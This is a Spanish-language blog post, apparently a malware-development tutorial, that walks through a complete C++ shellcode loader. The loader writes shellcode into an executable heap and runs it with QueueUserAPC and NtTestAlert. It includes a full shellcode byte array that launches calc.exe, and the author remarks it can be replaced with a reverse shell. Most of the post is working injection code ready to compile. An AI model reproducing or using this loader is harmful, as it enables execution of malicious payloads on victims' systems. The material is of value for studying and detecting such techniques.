---
layout: post
title: Shellcode almacenada en el heap e inyección vía APC injection y NtTestAlert en un proceso local
author: c4rta
date: 2023-07-17
tags: [MalDev]
image: /assets/img/heap-queue/waifu.jpg
---

Esta vez vamos a almacenar la shellcode en el heap de un proceso local usando HeapCrate y HeapAlloc y la ejecutaremos con QueueUserAPC y la NTAPI indocumentada NtTestAlert

## Asynchronous Procedure Calls (APC) y QueueUserAPC()

De acuerdo a la MSDN, una APC es:

> Es una función que se ejecuta de forma asíncrona en el contexto de un subproceso en particular

Cada subproceso tiene un propia cola APC, y un subproceso debe estar en un estado de alerta para ejecutar un APC en modo de usuario, algunas formas de indicarle a un subproceso que este en modo de alerta es con las funciones **SleepEx** , **SignalObjectAndWait**, **MsgWaitForMultipleObjectsEx**, etc.

La forma en la que podemos agregar una APC a la cola APC es usando **QueueUserAPC**, la estructura de QueueUserAPC es:

```c++
DWORD QueueUserAPC(
  [in] PAPCFUNC  pfnAPC,
  [in] HANDLE    hThread,
  [in] ULONG_PTR dwData
);
```

- **pfnAPC** es un puntero a la APC que se llamara cuando el subproceso realiza una operacion de alerta
- **hThread** es el identificador del hilo 
- **dwData** es un valor que funciona como un parametro a **pfnAPC**

## Flujo de ejecucion

- Crear un heap usando **HeapCreate**
- Se asigna un bloque de memoria con **HeapAlloc** del tamaño de la shellcode en el heap creado con **HeapCreate**
- Se escribe la shellcode en el bloque de memoria del heap usando **WriteProcessMemory**
- Se encola una APC en el subproceso actual usando **QueueUserAPC**
- Se llama **NtTestAlert** para forzar la ejecucion de la APC

### Codigo

```c++
#include <windows.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

unsigned char shellcode[] = {
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
	"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
	"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
	"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};

int main(){
    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    LPVOID shellcodeHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(shellcode));
    WriteProcessMemory(GetCurrentProcess(), shellcodeHeap, shellcode, sizeof(shellcode), NULL);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellcodeHeap;
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
    testAlert();

    return 0;
}
```

Pimero creamos un heap en donde le indicamos que en las opciones de asignacion tenga **HEAP_CREATE_ENABLE_EXECUTE** para que los bloques de memoria que se asignen permitan ejecutar codigo

```c++
HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
```

Despues asignamos un bloque de memoria donde le indicamos con **HEAP_ZERO_MEMORY** que la asignacion inicie con cero, y el tamaño de la asignacion sea el tamaño de la shellcode, por eso se usa **sizeof(shellcode)**

```c++
HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(shellcode));
```

Despues escribimos la shellcode en el bloque de memoria del heap, se usa **GetCurrentProcess()** para que el identificador del proceso sea el identificador del proceso actual, el tamaño en bytes que se van a escribir es igual al tamaño de la shellcode, por eso se vuelve a usar **sizeof(shellcode)**

```c++
WriteProcessMemory(GetCurrentProcess(), shellcodeHeap, shellcode, sizeof(shellcode), NULL);
```

Despues declaramos **apcRoutine** como un puntero **PTHREAD_START_ROUTINE** el cual se le asignara la direccion de memoria que tiene **shellcodeHeap**, con esto le indicariamos que la APC apunte a **shellcodeHeap** que es el bloque del heap que contiene la shellcode

```c++
PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellcodeHeap;
```

Despues encolamos una APC a la cola APC, se le pasa **(PAPCFUNC)apcRoutine** para que **apcRoutine** sea interpretado como un puntero de tipo **PAPCFUNC** y sea una APC valida, tambien usamos **GetCurrentThread()** para que se use el identificador del hilo actual

```c++
QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
```

Y por ultimo mandamos a llamar a **testAlert()** para forzar la ejecucion de las APC encoladas en el hilo actual.

Si compilamos y ejecutamos se ejecutara la shellcode que la cual abrira la calculadora (evidetemente puedes cambiar la shellcode para que haga otra cosa, una reverse shell por ejemplo)

![](/assets/img/heap-queue/ejecucion.gif)

### Referencias

[https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)

[https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)

[https://www.g0dmode.biz/remote-process-injection/queueuserapc-+-nttestalert](https://www.g0dmode.biz/remote-process-injection/queueuserapc-+-nttestalert)

Eso ha sido todo, gracias por leer ❤
